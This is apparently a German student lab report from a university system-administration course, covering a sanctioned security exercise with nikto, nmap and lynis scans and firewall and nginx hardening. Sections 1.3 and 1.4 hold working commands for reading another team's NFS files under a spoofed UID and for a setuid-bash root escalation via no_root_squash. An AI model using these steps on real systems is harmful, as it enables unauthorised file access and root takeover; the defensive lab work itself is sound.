# Aufgabenblatt 11

- gegeben: Angreifer hat Zugriff auf Netzwerk + lokale Kennung
- Sicherheitsüberprüfung aller VMs -> schließen gefundener Sicherheitslücken
- Suche nach Sicherheitslücken bei anderen Teams
- Installation von Programmen zum Schutz (wie Intrusion Detection)
- Beurteilen des eingesetzten Tools nach Wirksamkeit
- Dokumentation gefundener Sicherheitslücken und wie geschlossen in den folgenden Kategorien:
  - Eigene VMs, local exploit
  - Eigene VMs, remote exploit
  - Andere VMs, local exploit
  - Andere VMs, remote exploit

## Teilaufgaben

### 1. Remote Exploits

#### 1.1 nikto

nikto ist ein open soruce Webserver Scanner, der Webserver auf bekannte Sicherheitslücken, Fehlkonfigurationen und Schwachstellen scannt.

**Eigene VMs:**
Wir haben nikto auf allen webservern von vm6 mit z.B. `nikto -h http://web1.psa-team03.cit.tum.de -C all` ausgeführt. Dabei haben wir keine Sicherheitslücken gefunden haben aber ein paar warmings bekommen wobei bei http 2 warnungen und bei https noch zwei weitere warnungen aufgetreten sind.

**Warnungen waren:**

- `X-Frame-Options header not set` welche dem browser sagt ob die webseite in einen frame oder iframe geladen werden darf. Zwar ist das für uns keine wirkliche relevante sicherheitslücke da wir keine sensitiven interaktionen auf der webseite haben. Die Lösung ist aber einfach ein `add_header X-Frame-Options "SAMEORIGIN";` in der nginx config hinzufügen weshalb wir dies auch gemacht haben.
- `X-Content-Type-Options header not set` welche gegen gewisse XSS Angriffe als auch vor Missinterpretationen des Content-Types schützt. Auch hier ist die Lösung einfach ein `add_header X-Content-Type-Options "nosniff";` in der nginx config hinzufügen weshalb wir dies auch gemacht haben.
- als nächstes wurde angekreidet das wir HSTS nicht aktiviert haben. HSTS ist ein header welcher dem browser sagt das er die seite nur über https laden soll. Da die Webserver aber laut Aufgabenstellung auch unter http erreichbar sein sollen haben wir dies nicht gemacht.
- als letztes wurde bemängelt das es sich beim SSL Zertifikat um ein Wildcard Zertifikat handelt. Dies ist zwar nicht unsicher aber es wird empfohlen für kritische subdomains individuelle Zertifikate zu verwenden. Da wir aber keine kritischen subdomains haben und dies auch so von der Aufgabenstellung vorgegeben ist haben wir dies nicht geändert.

**Lösung:**

```nix
# nginx.nix
  services.nginx = {
    ...
    appendHttpConfig = 
    ''
      add_header X-Frame-Options "SAMEORIGIN";
      add_header X-Content-Type-Options "nosniff";
    '';
    };
```

**Andere VMs:**
Wir haben nikto auf den meisten webservern der anderen teams ausgeführt. Dabei konnten wir aber nichts relevantes finden da die meisten webserver keine kritischen daten enthalten und auch keine sensitiven interaktionen erlauben.

**Wirksamkeit:**
Das tool ist durachaus nützlich um sicherheitslücken in webservern zu finden war aber in unseren Fall nicht all zu hilfreich da unsere Webserver sher simple sind und keine kritischen Daten enthalten.

#### 1.2 nmap

nmap ist ein Netzwerkscanner, der Netzwerke auf offene Ports, Dienste und Sicherheitslücken scannt. Wir haben mit dem folgenden Skript von vm1 all unsere VMs gescannt:

```bash
#!/usr/bin/env bash

# Define the subnet to scan
subnet="192.168.6.0/24"
temp_file=$(mktemp)
hosts_file=$(mktemp)

echo "Performing host discovery on ${subnet}..."
nmap -sn $subnet -oG - | awk '/Up$/{print $2}' > $hosts_file

echo "Scanning live hosts for open ports..."
while IFS= read -r ip; do
    echo "Scanning ${ip}..."
    nmap -oG - -p 1-65535 "$ip" | grep -v "^#" >> $temp_file
done < $hosts_file

# Print results
echo ""
echo "Scan Results:"
echo "---------------------"
printf "%-15s %-40s %-70s\n" "IP Address" "Hostname" "Open Ports (with Service)"
echo "---------------------------------------------------------------------------------------------------------------"

cat $temp_file | awk '
/Up$/{ip=$2; hostname=$3}
/open/{print ip, hostname, $0}
' | awk '{
    # Extract open ports and services
    open_ports = ""
    for (i = 5; i <= NF; i++) {
        if ($i ~ /open/) {
            # Extract port, protocol, and service
            split($i, parts, "/")
            port_num = parts[1]
            service = parts[5]
            # Colorize port number (green) and service name (cyan) using ANSI escape codes
            open_ports = open_ports "\033[32m" port_num "\033[0m/open/tcp/\033[36m" service "\033[0m "
        }
    }
    # Print formatted output with columns
    printf "%-15s %-40s %-70s\n", $1, $2, open_ports
}'

rm $temp_file
rm $hosts_file
```

**Eigene VMs:**

```bash
IP Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.3.1     (vm1.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5355/open/tcp/llmnr      9100/open/tcp/jetdirect 
192.168.3.2     (vm2.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5432/open/tcp/postgresql 9100/open/tcp/jetdirect   9101/open/tcp/jetdirect 
192.168.3.3     (ns1.psa-team03.cit.tum.de)              22/open/tcp/ssh 53/open/tcp/domain   111/open/tcp/rpcbind     8123/open/tcp/polipo      9100/open/tcp/jetdirect 9101/open/tcp/jetdirect 9153/open/tcp/ 
192.168.3.4     (vm4.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5432/open/tcp/postgresql 
192.168.3.5     (vm5.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5355/open/tcp/llmnr      8080/open/tcp/http-proxy  8123/open/tcp/polipo    18555/open/tcp/ 
192.168.3.6     (vm6.psa-team03.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     111/open/tcp/rpcbind     443/open/tcp/https        5355/open/tcp/llmnr     9100/open/tcp/jetdirect 9101/open/tcp/jetdirect 9102/open/tcp/jetdirect    41027/open/tcp/ 
192.168.3.7     (vm7.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 389/open/tcp/ldap 
192.168.3.8     (vm8.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs       5355/open/tcp/llmnr     9100/open/tcp/jetdirect 20048/open/tcp/mountd      33469/open/tcp/          33761/open/tcp/ 
192.168.3.9     (vm9.psa-team03.cit.tum.de)              22/open/tcp/ssh 25/open/tcp/smtp     111/open/tcp/rpcbind     9154/open/tcp/ 
192.168.3.10    (vm10.psa-team03.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 3000/open/tcp/ppp        9090/open/tcp/zeus-admin  9100/open/tcp/jetdirect 9115/open/tcp/ 
```

**Sicherheitslücken:**
Hier ist zu sehen das bei einigen VMs unnötig viele Ports offen sind. Diese sollten geschlossen werden um die Angriffsfläche zu minimieren.

**Lösung:**
-> new firewall rules (siehe lynis) mit dem dann folgenden Ergebnis mit deutlich weniger angriefspunkten:

```bash
IP Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.3.1     (vm1.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind    5355/open/tcp/llmnr      9100/open/tcp/jetdirect 
192.168.3.2     (vm2.psa-team03.cit.tum.de)              22/open/tcp/ssh 9100/open/tcp/jetdirect 
192.168.3.3     (vm3.psa-team03.cit.tum.de)              22/open/tcp/ssh 53/open/tcp/domain      111/open/tcp/rpcbind     8123/open/tcp/polipo      9100/open/tcp/jetdirect 9101/open/tcp/jetdirect 9153/open/tcp/ 
192.168.3.4     (database.psa-team03.cit.tum.de)         22/open/tcp/ssh                                     
192.168.3.5     (vm5.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind    5355/open/tcp/llmnr      8080/open/tcp/http-proxy  8123/open/tcp/polipo    18555/open/tcp/ 
192.168.3.6     (web2.psa-team03.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http        443/open/tcp/https       9100/open/tcp/jetdirect   9102/open/tcp/jetdirect 
192.168.3.7     (ldap.psa-team03.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 
192.168.3.8     (fileserver.psa-team03.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind    139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs       9100/open/tcp/jetdirect 20048/open/tcp/mountd 43027/open/tcp/ 
192.168.3.9     (mail.psa-team03.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp        110/open/tcp/pop3        143/open/tcp/imap         9154/open/tcp/ 
192.168.3.10    (vm10.psa-team03.cit.tum.de)             22/open/tcp/ssh 3000/open/tcp/ppp       9090/open/tcp/zeus-admin 9115/open/tcp/ 
```

**Andere VMs:**

- team 01: zum Zeitpunkt des Scans nicht erreichbar
- team 02:

    ```bash
    IP Address      Hostname                                 Open Ports (with Service)                                             
    ---------------------------------------------------------------------------------------------------------------
    192.168.2.1     (ns.psa-team02.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain   5666/open/tcp/nrpe       8123/open/tcp/polipo 
    192.168.2.2     (vm2.psa-team02.cit.tum.de)              22/open/tcp/ssh 5666/open/tcp/nrpe   8123/open/tcp/polipo 
    192.168.2.3     (vm3.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
    192.168.2.4     (db.psa-team02.cit.tum.de)               22/open/tcp/ssh 3306/open/tcp/mysql  5666/open/tcp/nrpe       8123/open/tcp/polipo 
    192.168.2.5     (dbm.psa-team02.cit.tum.de)              22/open/tcp/ssh 3306/open/tcp/mysql  5666/open/tcp/nrpe       8123/open/tcp/polipo 
    192.168.2.6     (cloudserv.psa-team02.cit.tum.de)        22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
    192.168.2.7     (fileserver.psa-team02.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs     5666/open/tcp/nrpe 8123/open/tcp/polipo 
    192.168.2.8     (ldap.psa-team02.cit.tum.de)             22/open/tcp/ssh 389/open/tcp/ldap    636/open/tcp/ldapssl     5666/open/tcp/nrpe        8123/open/tcp/polipo 
    192.168.2.9     (mail.psa-team02.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp     110/open/tcp/pop3        143/open/tcp/imap         5666/open/tcp/nrpe    8123/open/tcp/polipo 
    192.168.2.10    (due.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
    ```

    - nfs share auf 192.168.2.7 aber mit fehlenden Portfreigaben
    - unverschlüsselte protokolle SMTP (Port 25), POP3 (Port 110) und IMAP (Port 143)

- team 04:

    ```bash
    192.168.4.1     (ns.psa-team04.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
    192.168.4.3     (vm04-03.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.4     (vm04-04.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.5     (vm04-05.psa-team04.cit.tum.de)          22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 
    192.168.4.6     (vm04-06.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.8     (vm04-08.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.9     (vm04-09.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.10    (vm04-10.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.11    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.12    (fileserver.psa-team04.cit.tum.de)       22/open/tcp/ssh 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
    192.168.4.13    (mail.psa-team04.cit.tum.de)             22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.14    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.15    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.20    (vm04-20.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.4.22    (ldap.psa-team04.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
    192.168.4.43    (vm04-04-ip43.psa-team04.cit.tum.de)     22/open/tcp/ssh 8123/open/tcp/polipo 
    ```

    - kein nfs share (nicht aufgabenstellungskonform)
    - generell viele fehlende Konfigurationen

- team 05:

    ```bash
    IP Address      Hostname                                 Open Ports (with Service)                                             
    ---------------------------------------------------------------------------------------------------------------
    192.168.5.1     (vm01.psa-team05.cit.tum.de)             22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
    192.168.5.2     (vm02.psa-team05.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
    192.168.5.3     (vm03.psa-team05.cit.tum.de)             8123/open/tcp/polipo                                
    192.168.5.4     (vm04.psa-team05.cit.tum.de)             22/open/tcp/ssh 5432/open/tcp/postgresql 8123/open/tcp/polipo 
    192.168.5.5     (vm05.psa-team05.cit.tum.de)             22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.5.6     (vm06.psa-team05.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 636/open/tcp/ldapssl 8123/open/tcp/polipo 9000/open/tcp/cslistener 
    192.168.5.7     (vm07.psa-team05.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 4000/open/tcp/remoteanything 4001/open/tcp/newoak 4002/open/tcp/mlchat-proxy 8123/open/tcp/polipo 9000/open/tcp/cslistener 
    192.168.5.8     (vm08.psa-team05.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp 143/open/tcp/imap 8123/open/tcp/polipo 9000/open/tcp/cslistener 9154/open/tcp/ 
    192.168.5.9     ()                                       22/open/tcp/ssh 80/open/tcp/http 8123/open/tcp/polipo 
    192.168.5.200   (web.psa-team05.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
    ```

    - nfs on 192.168.5.7 mit /16
    - unverschlüsselte protokolle SMTP (Port 25), IMAP (Port 143)

- team 06:

    ```bash
    IP Address      Hostname                                 Open Ports (with Service)                                             
    ---------------------------------------------------------------------------------------------------------------
    192.168.6.1     (shika.psa-team06.cit.tum.de)            22/open/tcp/ssh 53/open/tcp/domain 3000/open/tcp/ppp 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.2     (nm2acs.netz.lrz.de)                     22/open/tcp/ssh 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.3     (neko.psa-team06.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 443/open/tcp/https 2368/open/tcp/opentable 8123/open/tcp/polipo 9100/open/tcp/jetdirect 50727/open/tcp/ 
    192.168.6.4     (alphonse.psa-team06.cit.tum.de)         22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.5     (edward.psa-team06.cit.tum.de)           22/open/tcp/ssh 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.6     (kumo.psa-team06.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.7     (fileserver.psa-team06.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.8     (ldap.psa-team06.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.9     (meiru.psa-team06.cit.tum.de)            22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 143/open/tcp/imap 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    192.168.6.69    (web.psa-team06.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
    ```

    - fileserver auf 192.168.6.7 aber mit fehlenden Portfreigaben
    - unverschlüsselte protokolle SMTP (Port 25), POP3 (Port 110), IMAP (Port 143)
    - verschlüsselte protokolle IMAPS (Port 993), POP3S (Port 995)

- team 07: fast keine erreichbaren hosts

- team 08:

    ```bash
    IP Address      Hostname                                 Open Ports (with Service)                                             
    ---------------------------------------------------------------------------------------------------------------
    192.168.8.3     (vm003.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.8.4     (vm004.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.8.5     (vm005.psa-team08.cit.tum.de)            22/open/tcp/ssh 111/open/tcp/rpcbind 8123/open/tcp/polipo 
    192.168.8.6     (ns.psa-team08.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
    192.168.8.7     (vm007.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.8.9     (vm009.psa-team08.cit.tum.de)            22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 
    192.168.8.10    (vm010.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.8.11    (grafana.psa-team08.cit.tum.de)          22/open/tcp/ssh 111/open/tcp/rpcbind 443/open/tcp/https 2003/open/tcp/finger 2004/open/tcp/mailbox 2023/open/tcp/xinuexpansion3 2024/open/tcp/xinuexpansion4 3001/open/tcp/nessus 3002/open/tcp/exlm-agent 8123/open/tcp/polipo 8126/open/tcp/ 43153/open/tcp/ 
    192.168.8.12    (vm012.psa-team08.cit.tum.de)            22/open/tcp/ssh 111/open/tcp/rpcbind 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
    192.168.8.13    (ldap.psa-team08.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
    192.168.8.14    (vm014.psa-team08.cit.tum.de)            22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 111/open/tcp/rpcbind 143/open/tcp/imap 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 
    192.168.8.15    (vm015.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.8.254   (router.psa-team08.cit.tum.de)           22/open/tcp/ssh 111/open/tcp/rpcbind 8123/open/tcp/polipo
    ```

    - fileserver auf 192.168.8.12 aber mit fehlenden Portfreigaben
    - unverschlüsselte protokolle SMTP (Port 25), POP3 (Port 110), IMAP (Port 143)
    - verschlüsselte protokolle IMAPS (Port 993), POP3S (Port 995)

- team 09:

    ```bash
    IP Address      Hostname                                 Open Ports (with Service)                                             
    ---------------------------------------------------------------------------------------------------------------
    192.168.9.10    (vl-1772.csr1-krr.lrz.de)                22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 10050/open/tcp/zabbix-agent 
    192.168.9.11    ()                                       8123/open/tcp/polipo                                
    192.168.9.12    ()                                       8123/open/tcp/polipo                                
    192.168.9.13    ()                                       8123/open/tcp/polipo                                
    192.168.9.14    ()                                       8123/open/tcp/polipo                                
    192.168.9.15    ()                                       8123/open/tcp/polipo                                
    192.168.9.16    ()                                       8123/open/tcp/polipo                                
    192.168.9.17    ()                                       8123/open/tcp/polipo                                
    192.168.9.22    (tu-209.bro01-0gz.lrz.de)                8123/open/tcp/polipo   
    ```

    - fehlende Portfreigaben oder maßnahmen gegen nmap

- team 10:

    ```bash
    IP Address      Hostname                                 Open Ports (with Service)                                             
    ---------------------------------------------------------------------------------------------------------------
    192.168.10.1    ()                                       22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
    192.168.10.2    (firewall-yd.extern.netz.lrz.de)         22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.10.3    ()                                       22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
    192.168.10.4    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.10.5    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.10.6    (vl-3513.csr1-kw5.lrz.de)                8123/open/tcp/polipo                                
    192.168.10.7    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
    192.168.10.8    ()                                       22/open/tcp/ssh 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
    192.168.10.9    (bro01-ku1.netz.lrz.de)                  22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
    192.168.10.10   (tu-217.bro01-0gz.lrz.de)                22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 143/open/tcp/imap 443/open/tcp/https 465/open/tcp/smtps 587/open/tcp/submission 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 
    192.168.10.11   ()                                       22/open/tcp/ssh 3000/open/tcp/ppp 8123/open/tcp/polipo 
    192.168.10.80   ()                                       22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
    ```

    - fileserver auf 192.168.10.8 mit /16
    - unverschlüsselte protokolle SMTP (Port 25), POP3 (Port 110), IMAP (Port 143)
    - verschlüsselte protokolle IMAPS (Port 993), POP3S (Port 995)

**Wirksamkeit:**
Das tool ist durachaus nützlich alle hosts und deren Angriffspunkte zu finden und war in unseren Fall besonders hilfreich zur identifizierung der fileservers.

#### 1.3 nfs exploit

Ein großes Problem bei NFS ist, dass es standardmäßig keine Authentifizierung oder Verschlüsselung bietet. Das bedeutet, dass jeder, der Zugriff auf das Netzwerk hat, auf die freigegebenen Dateien zugreifen kann.

**Alle VMs:**
Wir haben im folgenden beispielsweise bei Team 05 deren NFS shares aufgedeckt und dort unter flaschen Nutzerdaten auf die Dateien zugegriffen die wir nicht hätten sehen sollen:

- aufzählung aller NFS-Exporte auf einem Server
    `nmap -p 111 --script nfs-ls.nse 192.168.5.7`
- (aufzählung aller shares)
    `showmount -e 192.168.5.7`
- mounting eines der gelisteten NFS-Exports hier beispielhaft `/export/atten`

    ```bash
    mkdir -p /mnt/nfs
    mount -t nfs 192.168.5.7:/export /mnt/nfs -o nolock
    ls -la /mnt/nfs
    # -> überprüfe welche UUID auf /export/atten zugriff hat
    useradd -m -u 10021 -G students newuser
    passwd newuser
    umount /mnt/nfs
    mount -t nfs 192.168.5.7:/export/atten /mnt/nfs -o nolock
    su - newuser
    cd /mnt/nfs
    cat atten.password
    ```

**Lösung:**
Einrichten von Berechtigungen und Authentifizierung für NFS shares aber das ist nicht wirklich der Sinn der NFS aufgabe gewesen da Aufgabe zwei SMB shares waren die genau dieses Problem löst. Folglich ist die deutlich einfachere/bessere lösung einfach SMB shares zu verwenden und NFS zu deaktivieren.

**Wirksamkeit:**
Die Methode ist sehr effektiv um die Sicherheitslücken von NFS zu demonstrieren und zu zeigen wie einfach es ist auf die Dateien zuzugreifen.

#### 1.4 nfs Privilege Escalation

Dieser Angriff ist unserer Meinung nach einer der gefährlichste Angriff in diesen Netzwerksetup da hier ein Angreifer der Zugriff auf einen NFS share hat root rechte auf dem Server erlangen kann.

**Eigene VMs:**
hier zum glück kein Problem da dies leicht mit der option `root_squash` beim einrichten des Fileshares verhindert werden kann bzw ist sogar standardmäßig aktiviert.

**Andere VMs:**
Hier ist uns zunächst aufgefallen das die meisten Teams ihren Fileserver zu diesen Zeitpunkt nicht von anderen Team-Netzwerken (wie verlangt im Aufgabenblatt) erreichbar gemacht haben. Nur bei Team 05 und 10 war es uns möglich überhaupt auf den Fileserver zuzugreifen. Bei Team 05 war es uns möglich auf den Fileserver zuzugreifen und die Dateien zu lesen aber nicht als root zu schreiben da hier die gennante Option aktiviert war. Bei Team 10 war die Sicherheitslücke offen und wurde wie folgt ausgenutzt:

```bash
mkdir -p /mnt/nfs
mount -t nfs 192.168.5.7:/export /mnt/nfs -o nolock
ls -la /mnt/nfs
# -> überprüfe welche UUID auf /export/atten zugriff hat
# find /mnt/nfs -writable
cd /mnt/nfs/atten # in ordner mit schreibrechten
cp $(which bash) .
ls -la    # -> testen welcher nutzer bash owned -> bei no_root_squash wird es leider nur nobody sein
chmod +s bash # -> setuid bit setzen -> bei ausführung rechte des owners -> root
./bash -p # -> root shell (erkennbar an `#` statt `$`)
```

Hier nach als atten auf einer beliebiegen VM des Teams 10 eingeloggt und `./bash -p` ausgeführt werden und man hat root rechte.

**Lösung:**
Die Lösung ist hier die Option `root_squash` zu aktivieren. Das bedeutet, dass der root-Benutzer auf dem Client als niemand (nobody) auf dem Server behandelt wird, wodurch keine bash datei mit root rechten erstellt werden kann.

**Wirksamkeit:**
Die Methode ist sehr effektiv um die Problemantik falsch konfigurierter NFS Shares zu demonstrieren und zu zeigen wie einfach es ist dadurch auf allen VMs root rechte zu erlangen.

### 2. lokale Exploits

#### 2.1 lynis

lynis ist ein open source Sicherheitsaudit-Tool für Unix-Systeme. Es scannt das System auf Schwachstellen, Sicherheitslücken und Konfigurationsfehler.

**Eigene VMs:**
Wir haben lynis auf unseren VMs mit `lynis audit system` ausgeführt. Zusammengefasst haben wir das folgende Ergebnis erhalten:

- Kernel: alles in Ordnung
- Memory and Processes: alles in Ordnung
- Users, Groups and Authentication: bis auf `locked accounts` nichts relevantes
- Shells: alles in Ordnung
- File Systems: alles in Ordnung (nur Enpfehlungen wie extra Partitionen für /home)
- Storage, USB, NFS: alles in Ordnung
- Name Services, Networking: alles in Ordnung bis auf `DNSSEC support unknown`
- Software firewalls: alles in Ordnung bis auf `unused rules`
- SSH: alles in Ordnung aber hardening empfohlen
- rest alles in Ordnung bis auf kernel hardening empfohlen

**Empfehlungen waren:**
Insgesamt hat lynis keine Sicherheitslücken gefunden, sondern nur Empfehlungen für die Verbesserung der Sicherheit gegeben. Das Tool ist sehr nützlich, um Schwachstellen und Konfigurationsfehler zu finden und zu beheben. Die meisten Empfehlungen sind für uns nicht relevant aber die bezüglichFirewall und SSH sind durchaus sinnvoll und haben wir wie folgt umgesetzt:

**Lösung:**

- Firewall: Aktuallisierung aller Firewall Regeln auf den Stand nach dem letzten Arbeitsblatt

    ```nix
    # router-network.nix
       firewall.extraCommands = '' 
      # by default: Drop all packages (in and outgoing) 
      iptables -P INPUT DROP 
      iptables -P FORWARD DROP 
      iptables -P OUTPUT DROP

      # by default: Disable connection tracking for HTTP and HTTPS
      iptables -t raw -A PREROUTING -p tcp --dport 80 -j NOTRACK  
      iptables -t raw -A OUTPUT -p tcp --sport 80 -j NOTRACK
      iptables -t raw -A PREROUTING -p tcp --dport 443 -j NOTRACK 
      iptables -t raw -A OUTPUT -p tcp --sport 443 -j NOTRACK

      # Allow: loopback
      iptables -A INPUT -i lo -j ACCEPT
      iptables -A OUTPUT -o lo -j ACCEPT

      # Allow established/related connections
      iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
      iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
      iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT


      # --- SSH (access to the router) ---
      iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT

      # --- ICMP --- 
      iptables -A INPUT -p icmp -j ACCEPT
      iptables -A OUTPUT -p icmp -j ACCEPT

      # --- DNS (server) --- 
      iptables -A INPUT -p udp --dport 53 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A INPUT -p tcp --dport 53 -m conntrack --ctstate NEW -j ACCEPT

      # --- DNS (client) --- 
      #iptables -A OUTPUT -p udp --dport 53 -m conntrack --ctstate NEW -j ACCEPT
      #iptables -A OUTPUT -p tcp --dport 53 -m conntrack --ctstate NEW -j ACCEPT

      # --- DHCP (server) ---
      iptables -A INPUT -p udp --dport 67 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A INPUT -p udp --dport 68 -m conntrack --ctstate NEW -j ACCEPT

      # --- HTTP/HTTPS (client) ---       
      iptables -A OUTPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 443 -m conntrack --ctstate NEW -j ACCEPT

      # --- Forwarding between networks ---
      iptables -A FORWARD -i enp0s8 -s 192.168.3.0/24 -d 192.168.0.0/16 -j ACCEPT
      iptables -A FORWARD -i enp0s8 -s 192.168.0.0/16 -d 192.168.3.0/24 -j ACCEPT 
   

      # Outgoing only to specific IPs
      iptables -A OUTPUT -d 146.75.118.217 -j ACCEPT # nixos cache
      iptables -A OUTPUT -d 151.101.2.217 -j ACCEPT
      iptables -A OUTPUT -d 151.101.130.217 -j ACCEPT
      iptables -A OUTPUT -d 151.101.66.217 -j ACCEPT
      iptables -A OUTPUT -d 151.101.194.217 -j ACCEPT
      iptables -A OUTPUT -d 131.159.0.0/16 -j ACCEPT
      iptables -A OUTPUT -d 192.168.1.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.2.0/24 -j ACCEPT 
      iptables -A OUTPUT -d 192.168.3.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.4.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.5.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.6.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.7.0/24 -j ACCEPT
